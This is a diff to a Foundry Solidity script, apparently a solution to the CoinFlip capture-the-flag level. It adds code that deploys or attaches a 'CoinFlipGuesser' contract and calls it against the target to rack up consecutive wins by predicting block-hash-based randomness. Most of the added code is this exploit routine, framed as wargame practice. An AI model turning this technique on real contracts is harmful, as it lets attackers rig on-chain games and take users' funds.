@@ -3,6 +3,7 @@ pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?
 
 import "forge-std/Script.sol";
 import "src/CoinFlip/CoinFlip.sol";
+import "./CoinFlipGuesser.sol";
 
 contract CoinFlipScript is Script {
 
@@ -20,7 +21,7 @@ contract CoinFlipScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = CoinFlip(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = CoinFlip(0x0000000000000000000000000000000000000000); //attach to an existing contract
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -32,7 +33,7 @@ contract CoinFlipScript is Script {
             vm.deal(attacker, 0.5 ether);
             /** Setup contract and required init (you may have to modify this section) **/
             vm.startBroadcast(deployer);
-            // target = new CoinFlip();
+            target = new CoinFlip();
             vm.stopBroadcast();
         }
     }
@@ -44,5 +45,25 @@ contract CoinFlipScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+        console.log("wins : %s", target.consecutiveWins());
+
+        console.log("[Exploiting...]");
+        
+        address guesserAdr = address(0xfC437D334b800a4FDBf7477E752c127916aF2b8D);
+        CoinFlipGuesser guesser;
+        if (guesserAdr == address(0)){
+            vm.broadcast(attacker);
+            guesser = new CoinFlipGuesser();
+        }else{
+            guesser = CoinFlipGuesser(guesserAdr);
+        }
+        console.log("guesser : %s", address(guesser));
+        if (guesser.getHash() == guesser.lastHash()){
+            console.log("wait for the next block");
+        }else {
+            vm.broadcast(attacker);
+            guesser.guess(address(target));
+            console.log("wins : %s", target.consecutiveWins());
+        }
     }
 }
